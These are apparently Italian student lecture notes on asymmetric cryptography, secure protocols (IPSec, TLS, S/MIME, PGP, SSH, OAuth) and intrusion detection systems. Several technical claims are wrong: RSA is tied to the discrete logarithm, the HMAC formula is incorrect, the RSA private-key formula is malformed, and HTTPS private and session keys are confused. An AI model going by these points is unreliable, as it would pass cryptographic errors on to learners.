Particolare tipo di funzione MAC che utilizza una funzione hashing $H$.

Il tag è generato in questo modo:

```
TAG = HMAC(K, m) = H(K || H(K || m))
```

= Lezione 12 - crittografia asimmetrica

La crittografia asimmetrica nasce per risolvere alcuni problemi nella
#strong[gestione] di chiavi #strong[simmetriche]:

- #strong[distribuzione] delle chiavi;
- #strong[autenticità] della chiave;
- nella crittografia simmetrica, affinché $n$ interlocutori riescano a
  comunicare ognuno deve generare $n minus 1$ chiavi (una per ogni altro
  interlocutore, escluso sè stesso), per un totale di
  $n lr((n minus 1))$ chiavi

== Key Distribution Center

Sistema di distribuzione di chiavi basato sulla crittografia simmetrica.

#image("assets/d0d8ef5cec9983ee4c11851d9c18bcea.png")

Necessita di 2 livelli di chiavi:

- una #strong[chiave di sessione], temporanea, utilizzata per la durata
  di una connessione logica;
- una #strong[chiave master] condivisa dal KDC e il sistema utente, da
  utilizzare per cifrare la chiave di sessione

Il KDC ha grossi problemi di scalabilità dovuti proprio alla
distribuzione della chiave master.

== Crittografia asimmetrica

Principi:

- ogni utente è dotato di una #strong[coppia di chiavi complementari];
- la #strong[chiave pubblica] può essere conosciuta da tutti;
- la #strong[chiave privata] dev'essere mantenuta #strong[segreta]

Il problema di distribuzione delle chiavi viene quindi semplificato:

- è sufficiente distribuire solo le #strong[chiavi pubbliche];
- essendo pubbliche, non c'è bisogno di dare garanzie di riservatezza;
- le chiavi pubbliche distribuite però devono essere
  #strong[autenticate]

=== Cifratura di Rivest, Shamir, Adleman (RSA)

Algoritmo di cifratura asimmetrica che si basa su diversi concetti
matematici:

- aritmetica modulare;
- #strong[logaritmo discreto]

La sua sicurezza è dovuta alla difficoltà nello scomporre in fattori
primi degli #strong[interi molto grandi].

Il problema della scomposizione di un numero in fattori primi è un
#strong[problema difficile]. Al momento non esistono "scorciatoie" se
non provare tutte le possibili combinazioni.

Si può quindi rendere questo algoritmo #strong[computazionalmente
inviolabile] utilizzando dei #strong[numeri primi grandi a piacere].

Un altro fattore di robustezza di RSA è dato dall'#strong[aritmetica
modulare].

L'aritmetica modulare possiede moltissime funzioni
#strong[unidirezionali] e #strong[semplici] da calcolare (es.
$lr((2 plus 3)) #h(0em) mod med 7 eq 5$).

L'aritmetica modulare ha interessanti proprietà per quanto riguarda le
#strong[potenze]: se $z eq v plus y plus w$, allora:
$ lr((x^z)) #h(0em) mod med q eq lr([lr((x^v)) #h(0em) mod med q times lr((x^y)) #h(0em) mod med q times lr((x^w)) #h(0em) mod med q]) #h(0em) mod med q $

Altra proprietà: scegliendo un numero primo $p$, mettendo insieme tutti
i risultati delle potenze $lr((2^i)) #h(0em) mod med p$ si ottiene una
#strong[permutazione] di tutti i numeri compresi nell'intervallo
$lr([1 comma p minus 1])$ (anche se questo non è vero per tutti i numeri
primi, es. $p eq 7$).

Sfruttando questa proprietà siamo certi del fatto che
$2^x eq 3 #h(0em) mod med p$ ha soluzione, ovvero siamo certi del fatto
che esiste una $x$ tale che $2^x / p$ ha resto $3$.

Per trovare questo valore $x$ bisogna risolvere il problema del
#strong[logaritmo discreto]. Se $p$ è molto grande, questo problema è
computazionalmente intrattabile.

=== Funzionamento dell'algoritmo

+ Alice sceglie due numeri primo molto grandi $p$ e $q$ da
  #strong[tenere segreti], es. $p eq 17$ e $q eq 11$;
+ Alice calcola $N eq p q eq 187$;
+ Alice sceglie un esponente $k$ (possibilmente primo anch'esso) tale
  che $k$ e $lr((p minus 1)) lr((q minus 1))$ siano primi tra loro (es.
  $k eq 7$);
+ Alice pubblica la coppia $lr((N comma k))$, che costituirà la sua
  #strong[chiave pubblica]

Nota: anche se $N$ è noto, risalire agli originali $p$ e $q$ è
computazionalmente intrattabile.

+ Alice calcola il valore
  $d eq lr((k d)) #h(0em) mod med lr((p minus 1)) lr((q minus 1))$
  (ovvero $d eq 23$). Questo valore rappresenta la sua #strong[chiave
  privata].

Nota: il valore $d$ può essere calcolato solo da Alice, perché è l'unica
che conosce i numeri $p$ e $q$.

Bob vuole quindi mandare un messaggio $C$ ad Alice cifrato utilizzando
la sua chiave pubblica.

+ Bob deve trasformare il messaggio in chiaro in un #strong[numero] $M$
  (es. Bob può convertire il testo in binario con codifica ASCII);
+ Bob calcola $C$ come $C eq lr((M^k)) #h(0em) mod med N$ (dove $k$ ed
  $N$ sono le componenti della chiave pubblica di Alice)

Supponendo che il messaggio da mandare sia la stringa `"X"` (che vale
`1011000` in binario, ovvero $M eq 88$ in decimale), applicando la
formula si ha $C eq lr((88^7)) #h(0em) mod med 187 eq 11$.

Per decifrare il messaggio $C$, Alice usa la formula
$M eq lr((C^d)) #h(0em) mod med N$, ovvero $M eq 88$.

==== Funzione unidirezionale speciale

L'algoritmo RSA sfrutta una #strong[funzione unidirezionale speciale].
"Speciale" perché questa funzione #strong[è invertibile] (e quindi è
possibile anche decifrare i messaggi utilizzando la stessa funzione), a
patto di avere alcuni dati a disposizione.

In particolare, la funzione di cifratura di RSA è invertibile da parte
di chi è in possesso dei coefficienti $p$ e $q$, necessari per calcolare
$d$ (chiave privata).

==== Crittoanalisi di RSA

L'algoritmo per la crittoanalisi è noto, ma è #strong[computazionalmente
intrattabile].

Il sistema RSA è sicuro nel momento in cui $N$ ha un #strong[centinaio
di cifre] e quindi la sua scomposizione in fattori primi supera le
capacità computazionali attuali e quelle del prossimo futuro.

Problema: per avere questo livello di robustezza occorre usare
#strong[chiavi molto lunghe], il che rende quest'algoritmo (e in
generale tutta la crittografia asimettrica) #strong[più oneroso] da
utilizzare rispetto alla crittografia simmetrica. Per queste ragioni, la
crittografia asimmetrica viene usata solo per lo #strong[scambio sicuro
di chiavi simmetriche].

Al giorno d'oggi una chiave RSA sicura dev'essere composta da almeno
2.048 bit (o 4.096).

== Algoritmo di Diffie-Hellman

Algoritmo per lo scambio sicuro di chiavi.

La sua robustezza sta nella diffocoltà nel calcolare il
#strong[logaritmo discreto] di numeri molto grandi.

+ Alice e Bob si scambiano due numeri $P$ e $G$ su un #strong[canale
  insicuro], dove:

- $P$ è un numero primo molto grande;
- $G$ è un #strong[numero generatore]

#block[
#set enum(numbering: "1.", start: 2)
+ Alice sceglie un numero $a$ da tenere privato, calcola
  $X eq G^a #h(0em) mod med P$ ed invia $X$ a Bob;
+ Bob sceglie un numero $b$ da tenere privato, calcola
  $Y eq G^b #h(0em) mod med P$ ed invia $Y$ ad Alice;
+ Alice calcola il valore $k_a eq Y^a #h(0em) mod med P$;
+ Bob calcola il valore $k_b eq X^b #h(0em) mod med P$
]

È dimostrabile come $k_a eq k_b$. Questa è la chiave #strong[simmetrica]
che Alice e Bob utilizzeranno per comunicare.

L'algoritmo di Diffue-Hellman è utilizzato in numerosi protocolli
sicuri:

- SSH;
- TLS;
- IPSec;
- Public Key Infrastructure (PKI)

= Lezione 13 - applicazioni della crittografia

Garanzie cercate nella comunicazione su Internet:

- #strong[riservatezza] (o #strong[confidenzialità]): il messaggio
  dev'essere leggibile solo da quelli autorizzati;
- #strong[integrità]: il destinatario deve poter accorgersi se il
  messaggio è stato alterato rispetto a quello inviato dal mittente;
- #strong[autenticità]: certezza dell'"identità" del mittente;
- #strong[non ripudio]

== Firma digitale

Permette di ottenere:

- #strong[autenticità] del messaggio;
- #strong[non repudiabilità] del messaggio

+ Alice inserisce in coda al proprio messaggio un #strong[digest],
  cifrato con la sua #strong[chiave privata];
+ Alice cifra `messaggio + digest` con la #strong[chiave pubblica] di
  Bob e manda il messaggio cifrato;
+ Bob decifra il messaggio utilizzando la sua chiave privata e decifra
  il digest di Alice utilizzando la sua #strong[chiave pubblica]. Se
  questa decifratura ha successo, allora Bob ha la garanzia che il
  messaggio gliel'ha mandato davvero Alice e non qualcuno che si spaccia
  per lei.

Problema: Bob dev'essere a conoscenza della chiave pubblica di Alice.
Affinché questo sistema funzioni dev'essere predisposto un meccanismo di
#strong[distribuzione di chiavi pubbliche autenticate].

== Certification Authority

Nel sistema PKI, la CA #strong[firma la chiave pubblica] di Alice. In
questo modo Bob ha la garanzia che la chiave pubblica di Alice sia
davvero la sua.

Sia Bob che Alice devono #strong[fidarsi] della CA.

Le CA rilasciano dei #strong[certificati] (chiavi pubbliche + metadati,
es. data di validità) che garantiscono la connessione tra una chiave
pubblica ed un'entità (azienda, dominio, ecc.).

=== Rilascio di un certificato digitale

+ Bob crea una coppia di chiavi asimmetriche;
+ Bob firma la propria identità e la propria chiave pubblica utilizzando
  la sua chiave privata;
+ Bob invia il messaggio alla CA, creando una #strong[Certificate
  Signing Request]

Essendo firmato con la sua chiave privata, Bob dimostra alla CA di
essere in possesso della chiave privata. Inoltre si garantisce
#strong[integrità] del messaggio.

La CA:

#block[
#set enum(numbering: "1.", start: 4)
+ verifica la firma di Bob (ovvero verifica che con la sua chiave
  pubblica sia possibile risalire alla coppia (chiave pubblica, ID) di
  Bob);
+ verifica l'identità di Bob (passaggio #strong[fondamentale] in quanto
  chiunque può generare un CSR);
+ crea un #strong[certificato digitale] che contiene, tra le altre cose,
  la corrispondenza tra la chiave pubblica di Bob e la sua identità;
+ firma il certificato con la propria chiave privata;
+ spedisce il certificato firmato a Bob
]

Quindi, Bob:

#block[
#set enum(numbering: "1.", start: 9)
+ verifica che la firma della CA sia valida (e.g.~cerca di decifrare il
  messaggio utilizzando la chiave pubblica della CA);
+ verifica la correttezza dei dati presenti nel certificato digitale (in
  particolare verifica che non siano state alterate chiave pubblica ed
  identità)
]

== Protocolli sicuri

I protocolli storici IP e TCP sono stati progettati in un periodo in cui
la #strong[sicurezza] non era minimamente tenuta in considerazione.

Al giorno d'oggi però è necessario garantire #strong[riservatezza],
#strong[integrità] ed #strong[autenticità] dei messaggi.

I protocolli sicuri si inseriscono all'interno dello stack TCP/IP già
esistente. Alcuni sono #strong[estensioni] di protocolli già esistenti
(es. IPSec e MACSec, estensioni di IP ed Ethernet), mentre altri vanno a
creare dei veri e propri #strong[livelli intermedi] nello stack.

Per creare questi nuovi livelli intermedi si utilizza la tecnica del
#strong[tunneling] (incapsulamento).

=== IPSec

Architettura di sicurezza completa per il traffico a livello IP.

Obiettivi di IPSec:

- trasformare il livello 3, tipicamente #strong[connectionless], in un
  livello #strong[stateful]
  - il componente #strong[Security Association] (SA) ha il compito di
    creare delle #strong[sessioni] a livello network;
- #strong[autenticare] la sorgente e dare garanzie di #strong[integrità]
  anche sul payload (nota: a livello 3 il checksum è fatto solo sugli
  header) (componente #strong[Authentication Header] (AH));
- #strong[crittografare] il messaggio (componente #strong[Encapsulation
  Security Payload] (ESP))

IPSec ha anche un ulteriore componente, chiamato #strong[Internet Key
Exchange] (IKE) per la gestione delle chiavi simmetriche.

==== Security Association

Si instaura una sessione tramite una fase di #strong[negoziazione] dei
parametri (es. cifrario da utilizzare, ecc.).

Ogni sessione IPSec è identificata da un #strong[SA identifier] per
permettere allo stesso host di avere più sessioni attive
contemporaneamente.

Le SA sono #strong[unidirezionali]: per poter avere una comunicazione
bidirezionale occorre instaurare 2 connessioni separate.

Le principali informazioni contenute in una SA sono:

- protocollo di sicurezza utilizzato (AH o ESP);
- indirizzo IP sorgente;
- identificatore che contiene i #strong[Security Parameter Index] (SPI)

Quando un host riceve un pacchetto, questo può essere autenticato (o
decifrato) solo se il ricevente può far riferimento allo stesso SA
identifier, determinato in fase di negoziazione.

Componenti principali delle SA:

- #strong[Security Policy Database] (SPD): contiene le policy di
  sicurezza da applicare ai diversi tipi di comunicazione;
- #strong[Security Association Database] (SAD): DB che contiene l'elenco
  delle SA attive e le relative caratteristiche (algoritmi, ecc.)

==== Transport mode e tunnel mode

La modalità #strong[transport mode] è utilizzata per creare una
#strong[connessione end-to-end] tra #strong[due host] (NON tra due
gateway).

Ogni host che vuole comunicare deve avere tutto il software per poter
utilizzare IPSec, il che diventa molto complesso se gli host da
connettere sono molti.

La modalità #strong[tunnel mode] è utilizzata per creare una
#strong[connessione tra reti] (e.g.~tra gateway). Solo i gateway devono
avere il software per poter utilizzare IPSec, quindi la gestione è più
semplice rispetto al transport mode. Tuttavia questi gateway devono
essere anche molto potenti per gestire il traffico.

Se si vuole identificare e differenziare i nodi in base al loro IP
sorgente, la modalità #strong[transport] è l'unica utilizzabile.

==== Protocolli di autenticazione e crittografia di IPSec

Il protocollo AH permette di garantire l'#strong[autenticità della
sorgente] e il #strong[controllo d'integrità] dell'#strong[intero]
datagram IP. Nella pratica, AH aggiunge un header intermedio tra il
livello 3 e 4.

Il protocollo ESP fornisce garanzia di #strong[riservatezza] tramite
tecniche di cifratura e, opzionalmente nelle versioni più recenti, di
#strong[autenticazione].

AH ed ESP possono essere usati singolarmente oppure insieme.

==== Protocolli per lo scambio di chiavi in IPSec

IPSec utilizza delle chiavi #strong[simmetriche].

È necessario predisporre un meccanismo per lo scambio di queste chiavi.

Il protocollo IKE utilizza il sotto-protocollo #strong[ISAKMP], il quale
stabilisce le procedure per attivare e terminare una SA.

Il protocollo IKE è diviso in 2 fasi:

+ autenticazione dell'utente remoto che vuole iniziare una connessione
  IPSec e successivo scambio di chiavi;
+ negoziazione dei parametri della SA

Lo scambio di chiavi può avvenire in due modalità:

- #strong[pre-shared key]: si utilizza una #strong[chiave già scambiata]
  in precedenza tramite altri canali. Utilizzabile quando gli host non
  hanno un indirizzo IP fisso;
- #strong[certificato digitale]: ogni entità che si connette con IPSec
  possiede un certificato digitale (eventualmente amministrato da una
  CA). Utilizzabile solo se gli host hanno un indirizzo IP fisso

==== Vantaggi e svantaggi di IPSec

- rende sicure tutte le comunicazioni a livello network, di conseguenza
  tutti i protocolli che usano IP beneficiano di alti livelli di
  sicurezza;
- è complesso da gestire;
- è pensato per essere #strong[punto-punto], non funziona per
  comunicazioni #strong[broadcast]

=== SSL e TLS

SSL (Secure Socket Layer) è un protocollo pubblico #strong[non
proprietario] la cui prima versione pubblicata (SSL 2.0) risale al 1994.

La versione SSL 3.1, rilasciata nel 1998, è conosciuta anche col nome
#strong[Transport Layer Security] (TLS).

SSL è un protocollo #strong[indipendente dalla piattaforma]. Opera tra
il livello trasporto e quello applicativo.

Proprietà garantite da SSL:

- riservatezza della trasmissione, sfruttando la crittografia
  simmetrica;
- autenticazione, sfruttando il meccanismo dei #strong[certificati];
- integrità, garantita da un #strong[message authentication code]

SSL è organizzato su due livelli:

+ #strong[SSL handshake]: utilizzato per iniziare la connessione.
  Prevede la negoziazione di diversi parametri di sicurezza (algoritmo
  da usare, ecc.) e l'autenticazione dei due interlocutori;
+ #strong[SSL record]: si occupa del trasferimento dei dati, cifrandoli
  mediante la #strong[chiave simmetrica di sessione] condivisa durante
  l'handshake

L'handshake permette al client e al server di cooperare per definire una
chiave simmetrica comune.

L'handshake prevede #strong[sempre] l'autenticazione del server.
L'autenticazione del client, pur essendo prevista dal protocollo,
raramente viene usata nella pratica.

Quando un server riceve una richiesta di handshake SSL, è tenuto a
mandare la propria #strong[catena di certificati] in modo da permettere
al client di autenticarlo.

L'integrità dei dati in SSL viene garantita sfruttando delle funzioni
MAC:

+ il mittente calcola l'hash del messaggio e lo usa per generare il MAC,
  che verrà posto in coda al messaggio;
+ il destinatario decifrerà il MAC con la propria chiave simmetrica,
  ricalcolerà l'hash e verificherà che coincida con quello ricevuto nel
  pacchetto

== Servizi applicativi sicuri

=== HTTPS

HTTP over TLS. Utilizza lo stesso sistema di chiavi di TLS:

- la chiave pubblica viene utilizzata per trasmettere la #strong[chiave
  di sessione] TLS;
- la chiave privata, ovvero quella di sessione, viene utilizzata per
  cifrare i dati

Il server deve aver installato un certificato emesso da una CA
riconosciuta.

Una volta creata la connessione sicura con HTTPS, l'interazione è
protetta da IP spoofing e masquerading, perché le informazioni non sono
leggibili senza avere le chiavi private.

Le chiavi private possono essere violate, ma siccome

- cambiano ad ogni sessione;
- sono soggette a timeout

difficilmente l'attaccante riesce a violarle in tempo utile.

=== Posta elettronica sicura

Il protocollo SMTP è in chiaro e non richiede autenticazione.

Questo comporta il rischio di #strong[message forging], ovvero l'uso di
#strong[mittenti falsi].

I protocolli principali per garantisce #strong[sicurezza end-to-end]
delle email sono #strong[S/MIME] e #strong[PGP].

- S/MIME si basa sul sistema PKI (CA, ecc.) per la distribuzione e la
  certificazione delle chiavi pubbliche;
- PGP si basa sul concetto di #strong[web of trust]

==== S/MIME

#strong[MIME] è un protocollo che permette di inserire all'interno dello
stesso messaggio dati non necessariamente testuali (es. audio, video,
ecc.).

Il protocollo MIME prevede l'uso di 5 header:

- MIME-Version;
- Content-Type;
- Content-Transfer-Encoding (indica la codifica usata per trasformare in
  testo i dati binari);
- Content-ID (opzionale, può contenere il nome del file);
- Content-Description (opzionale, descrizione sul contenuto)

Il sotto-tipo più importate di MIME è #strong[mixed]. Viene utilizzato
per includere più parti all'interno dello stesso messaggio. Ognuna di
queste parti può essere un tipo MIME differente ed è separata da una
#strong[boundary string], definita nel Content-Type.

#image("assets/4d881f11114a75a5df068967223b483d.png")

S/MIME aggiunge nuovi tipi e sottotipi a MIME. I più importanti sono:

- `application/pkcs7-mime; smime-type=enveloped-data`, utilizzato per
  trasmettere dati cifrati;
- `application/pkcs7-mime; smime-type=signed-data`, utilizzato per
  trasmettere dati firmati;
- `multipart/signed`, utilizzato per retrocompatibilità con chi non
  possiede MIME, questo Content-Type permette di firmare dei
  #strong[messaggi in chiaro]

S/MIME garantisce:

- autenticità del mittente del messaggio;
- integrità del messaggio;
- non ripudiabilità;
- confidenzialità

S/MIME si basa sul sistema PKI, quindi ogni utente deve possedere un
certificato rilasciato da una CA. La validazione dei certificati
funziona sempre al solito modo (catena, ecc.).

Problemi di S/MIME:

- dare un certificato a #strong[tutti] gli utenti è molto complesso;
- col tempo sono aumentate le #strong[web mail], che richiedevano agli
  utenti di condividere le chiavi segrete con il server per poter
  leggere le email;
- la cifratura impedisce il controllo del messaggio da parte degli
  antivirus

==== PGP

Alternativa a S/MIME che non si basa sul sistema PKI.

È lo standard de facto per la crittografia della posta elettronica.

Idea di base: usare la crittografia asimmetrica solo per cifrare e
scambiarsi la chiave simmetrica.

Schema completo:

#image("assets/872aff745c42e29f04beb5083a39ecf0.png")

Partendo da PGP è stato sviluppato #strong[GPG] (GNU Privacy Guard),
un'implementazione open source di PGP che non usa l'algoritmo
proprietario IDEA per la cifratura.

GPG è compatibile con PGP ed offre anche alcune funzionalità aggiuntive.

Schema per la cifratura:

#image("assets/f298aa21cdfc865154ac54574f1a4e8a.png")

Schema per la firma digitale:

#image("assets/1f8dfd944ea98bbc88df6d32fbb55455.png")

==== PEC - Posta Elettronica Certificata

Principi:

- la validità di un messaggio di posta inviato tramite PEC è la stessa
  di una raccomandata con ricevuta di ritorno;
- certezza della ricezione;
- non ripudiabilità dell'invio;
- integrità del messaggio;
- possibilità di stabilire data e ora di consegna

Esiste un elenco dei provider autorizzati ad offire servizio PEC.

PEC utilizza il protocollo S/MIME, ma non implementa le funzionalità di
#strong[cifratura] del messaggio (viene sempre trasmesso in chiaro).

=== SSH

Protocollo utilizzato per l'#strong[accesso remoto] ad un host
stabilendo un #strong[tunnel cifrato] tra un client SSH ed un server
SSH.

==== 1. Instaurazione della connessione

Client e server devono creare un #strong[canale sicuro] #strong[prima]
che inizi l'autenticazione dell'utente, in modo da non trasmettere in
chiaro le sue credenziali.

In questa fase viene generata una #strong[chiave simmetrica] e si
utilizza l'#strong[algoritmo di Diffie-Hellman] per scambiarla.

Ogni host ha una coppia di #strong[host key], una pubblica ed una
privata. Vengono utilizzate in modo trasparente agli utenti e sono
create in automatico nel momento in cui si installa `ssh`.

All'avvio di ogni sessione, gli host si scambiano tra loro le proprie
host key pubbliche.

==== 2. Autenticazione dell'utente

Una volta creato il canale sicuro, il server può verificare le
credenziali dell'utente in 2 modi:

- username/password;
- chiave pubblica

== Identity, AuthN, AuthZ

Differenziare i termini:

- #strong[identità]: informazione che #strong[identifica un'entità] nel
  sistema (es. un host);
- #strong[autenticazione]: processo che permette all'entità di
  #strong[dimostrare la propria identità] (es. tramite password);
- #strong[autorizzazione]: processo che stabilisce quali risorse possono
  essere accedute in base alla propria identità

L'autorizzazione può essere anche #strong[delegata] (es.
single-sign-on):

- esiste un server che permette agli utenti di autenticarsi (es.
  Google). Di solito questi server memorizzano anche informazioni
  sull'utente;
- altri servizi si appoggiano a questo servizio d'autenticazione per
  autenticare gli utenti

=== OAuth

Protocollo per la delega dell'autenticazione.

Obiettivi:

- permettere ad applicazioni di terze parti di accedere ai dati
  memorizzati su un altro server;
- regolare i processi di autorizzazione e autenticazione dell'utente;
- evitare che applicazioni di terze parti possano vedere le credenziali
  dell'utente

Implementazione:

- vengono distribuiti dei #strong[token] per ogni applicazione
  (#strong[bearer token]);
- si utilizzano protocolli web standard (HTTP, HTTPS)

Ruoli coinvolti:

- resource owner (utente)
  - deve accedere ad applicazioni che hanno bisogno dei suoi dati
- authorization server
  - l'unico attore che memorizza le credenziali dell'utente
- resource server
  - memorizza i dati dell'utente
- client
  - applicazione di terze parti che ha bisogno di accedere ai dati
    dell'utente

==== Operazioni principali per il client

Nota: in questo caso il client non è l'utente (che è invece il resource
owner), ma è l'applicazione di terze parti che ha bisogno di accedere ai
dati dell'utente.

===== 1. Registrazione del client

OAuth non definisce nessun protocollo specifico per la registrazione.
Assume però che il client fornisca al provider:

- dominio;
- `redirect_uri` (URL alla quale ridirezionare l'utente dopo il login);
- `scope` (a quali dati il client deve accedere);
- altri metadati opzionali (tipicamente nome del servizio e logo)

Il provider dovrà restituire al client:

- un `client_id`, per identificarlo;
- una `client_secret` che il client dovrà utilizzare per identificarsi
  al provider

===== 2. Ottenere l'autorizzazione

Questa fase dipende dal tipo di applicazione.

Nel caso delle applicazioni web si può assumere questo scenario:

+ l'utente atterra sulla pagina e trova il pulsante "Login con Google";
+ al click sul pulsante, l'utente viene ridirezionato alla pagina di
  login di Google. In questa fase, il client include nell'URL di
  redirect `client_id`, `scope` e `redirect_uri`;
+ l'utente inserisce le proprie credenziali nel form di Google. Prima di
  farlo, è tenuto a verificare la validità del certificato HTTPS e
  l'entità (client) che sta richiedendo i dati all'utente;
+ dopo il login, l'utente viene nuovamente ridirezionato verso l'URL
  indicata nel parametro `redirect_uri`. L'authorization server include
  nell'URL di redirect anche il parametro `authorization_code`;
+ il client richiede all'authorization server un #strong[access token]
  (che ha una scadenza molto breve) ed un #strong[refresh token] (da
  utilizzare per aggiornare l'access token) per accedere al resource
  server

#image("assets/9b4fc7c22619aaea0c3d2fee979b34ae.png")

= Lezione 14 - Intrusion Detection Systems

Definizioni:

- #strong[intrusione]: insieme di azioni volte a compromettere la
  #strong[sicurezza] (intesa come integrità/riservatezza/disponibilità)
  di una risorsa;
- #strong[intrusion detection]: processo di #strong[identificazione]
  delle attività di intrusione. Non include #strong[prevenzione] e
  #strong[reazione] alle intrusioni

Possibili funzioni di un IDS:

- monitorare e #strong[loggare le attività];
- controllo della #strong[configurazione del sistema] per rilevare
  eventuali criticità;
- valutare l'integrità di file critici;
- riconoscedere dei #strong[pattern d'attacco noti] all'interno del
  traffico di rete;
- #strong[identificare] attività anormali del sistema analizzando il
  traffico di rete;
- #strong[attività attive]: correggere la configurazione del sistema,
  modificare i diritti d'accesso, ecc.

Nessun singolo IDS esegue tutte queste funzioni.

L'intrusion detection è fondamentale, perché:

+ permette di implementare una #strong[difesa multilivello]
  (#strong[defence in depth]);
+ permette di rilevare attacchi anche provenienti #strong[dall'interno]
  della rete;
+ registrare attacchi (e tentativi d'attacco) è utile sia per motivi
  legali, sia per giustificare il budget speso per la sicurezza

Gli intrusion detectors partono da queste assunzioni:

- le attività del sistema sono #strong[osservabili];
- è possibile distinguere #strong[attività normli] e #strong[attività
  anormali]

#image("assets/b4e1d57d2a9e088dfb1e404a4bcc612b.png")

Definizione: #strong[intrusion detection system] (IDS). Sistema di
#strong[rilevazione], #strong[segnalazione] e #strong[logging] delle
#strong[attività di intrusione] o di #strong[utilizzo illecito] di
dispositivi/applicazioni di rete.

Funzionalità base di un IDS:

- #strong[analisi]: sia riferita al traffico di rete, sia riferita ai
  #strong[log] stessi che raccoglie l'IDS;
- #strong[rilevamento] delle attività sospette;
- #strong[allerta] dei responsabili della sicurezza;
- #strong[logging] dettagliato delle attività rilevate

Altre funzionalità:

- diverse modalità di allerta (es. SMS, pop-up, ecc.);
- diversi tipi di interfaccia;
- #strong[filtraggio] dei contenuti loggati;
- capacità di collaborare con altri sistemi più o meno eterogenei

Esistono poi anche delle #strong[funzionalità attive] che fanno tendere
gli IDS a dei sistemi IPS (Intrusion #strong[Prevention] System).

Gli IDS si basano su dei #strong[modelli]. Gli IDS usano i modelli per
raccogliere le #strong[evidenze] dai dati raccolti e per
#strong[collegare tra loro] queste evidenze, in modo da identificare
possibili attività illecite.

I modelli possono essere forniti a mano all'IDS oppure può avere
funzionalità di #strong[auto-apprendimento] basato sui dati raccolti.

== Prestazioni di un IDS

Problemi principali di un IDS:

- #strong[falsi positivi]: attività lecite ma rilevate come illecite;
- #strong[falsi negativi]: attività illecite ma rilevate come lecite
  (es. attacchi 0-day)

Un IDS perde #strong[accuratezza] quando tende a segnalare erroneamente
un'intrusione (e.g.~falsi positivi).

Un IDS perde #strong[completezza] quando tende a non segnalare
un'intrusione (e.g.~falsi negativi).

Definiti gli eventi $A$ (allarme) ed $I$ (intrusione), è possibile fare
una valutazione algoritmica degli IDS: - probabilità di
#strong[detection]: $bb(P) lr((A bar.v I))$; - probabilità di
#strong[non detection]: $bb(P) lr((not A bar.v I))$; - probabilità di
#strong[falsi allarmi]: $bb(P) lr((A bar.v not I))$; - probabilità di
#strong[mancati allarmi]: $bb(P) lr((not A bar.v not I))$;

Quella che a noi interessa è la #strong[probabilità di detection
Bayesiana]:
$ bb(P) lr((I bar.v A)) eq frac(bb(P) lr((A sect I)), bb(P) lr((A))) eq frac(bb(P) lr((I)) bb(P) lr((A bar.v I)), bb(P) lr((I)) bb(P) lr((A bar.v I)) plus bb(P) lr((not I)) bb(P) lr((A bar.v not I))) $

Problema del tasso base: anche se l'IDS individua tutti i tentativi di
intrusione (ovvero $bb(P) lr((A bar.v I)) eq 1$) e il tasso di falsi
positivi è molto basso (es.
$bb(P) lr((A bar.v not I)) eq 10^(minus 5)$), se il tasso di intrusione
è basso (es. $bb(P) lr((I)) eq 2 times 10^(minus 5)$), allora anche la
probabilità di detection Bayesiana $bb(P) lr((I bar.v A))$ è bassa.

Conclusioni:

- necessità di progettare algoritmi per ridurre il tasso di falsi
  positivi;
- realizzare IDS con un tasso base sufficientemente elevato

La valutazione #strong[sistemistica] degli IDS si basa su altri
parametri, quali:

- prestazioni;
- scalabilità;
- resistenza agli attacchi diretti all'IDS stesso

== Tipologie di IDS

Gli IDS si differenziano in base a diversi parametri:

- metodi di rilevamento delle intrusioni
  - signature-based;
  - anomaly detection;
- obiettivo dell'analisi
  - attività di sistema (Host Intrusion Detection System - HIDS);
  - attività di rete (Network Intrusion Detection System - NIDS);
- tempo di rilevamento
  - offline (#strong[a posteriori]): registrazione dei log e successiva
    analisi;
  - online: osservazione ed analisi delle attività (e successivi
    allarmi) #strong[in tempo reale];
- tipo di reazione
  - passiva (viene lanciato solo l'allarme);
  - attiva (l'IDS cerca attivamente di risolvere il problema);
- localizzazione (dove si trova l'IDS)
  - su un host
  - sull'intera rete
- modalità di analisi
  - stateless
  - stateful

#image("assets/e7edacff40e81161ee198ac3b4be3d85.png")

=== Modelli di analisi

- #strong[signature analysis]: comportamento basato sull'assunto che gli
  attacchi possono essere individuati ricercando #strong[pattern
  specifici];
- #strong[statistical analysis] (o #strong[anomaly detection]): operano
  definendo il normale comportamento del sistema e cercando deviazioni
  sostanziali da esso. Si basano sull'assunto che gli attacchi sono solo
  un sottoinsieme delle anomalie (che infatti potrebbero essere dovute
  anche ad altri problemi, es. di rete)

==== Signature analysis

Esempio: `if src_ip == dst_ip then land_attack = 1`.

Simili ai sistemi di allerta degli antivirus.

Vantaggi:

- sono molto accurati;
- se i pattern sono ben progettati, la probabilità di falsi positivi è
  molto bassa (soprattutto se confrontata col meccanismo di anomaly
  detection);
- sono veloci (devono soltanto effettuare operazioni di #strong[pattern
  matching]);
- sono semplici da implementare;
- applicabile a tutti i protocolli

Svantaggi:

- se il pattern non esiste (es. attacchi 0-day), non è possibile
  rilevare l'attacco;
- una piccola modifica al pattern d'attacco classico causa dei falsi
  negativi;
- necessità di aggiornare continuamente il database dei pattern
  d'attacco;
- tecnica #strong[orientata ai pacchetti], dunque facilmente eludibile
  tramite frammentazione e segmentazione (contromisura: #strong[stateful
  pattern matching], più complesso da evadere ma richiede anche più
  carico sul processore)

==== Anomaly detection

#image("assets/9ea988a5f660071365e5796958aa5f2c.png")

Si basano sull'assunto che sia possibile definire il comportamento
"normale" di un sistema. Qualunque deviazione da questo comportamento è
una possibile intrusione.

Hanno un tasso di falsi positivi molto alto, perché non tutte le
anomalie sono delle intrusioni.

Vantaggi:

- possibilità di individuare anche #strong[attacchi sconosciuti] tramite
  meccanismi di #strong[self-learning];
- scarso overhead sul sistema (la maggior parte delle analisi è offline)

Svantaggi:

- scarsa accuratezza;
- prestazioni fortemente dipendenti dal modello scelto;
- difficoltà nella modellazione di sistemi complessi e molto eterogenei

===== Protocol anomaly detection

Specializzazione degli anomaly detection basata sui modelli dei
protocolli dello stack TCP/IP ottenuti partendo dalle specifiche (RFC)
che li definiscono.

Vantaggi:

- facilmente implementabile, almeno per i protocolli standard;
- minimizzazione dei falsi positivi rispetto ad un'analisi
  generalizzata;
- necessitano meno aggiornamenti (i protocolli si evolvono molto più
  lentamente rispetto alle applicazioni che li usano);
- possibilità di rilevare facilmente variazioni di attacchi standard
  senza dover modificare dei pattern

Svantaggi:

- ambiguità negli RFC generano dei falsi positivi;
- alcune applicazioni non rispettano completamente le specifiche degli
  RFC;
- implementazione non immediata per protocolli complessi

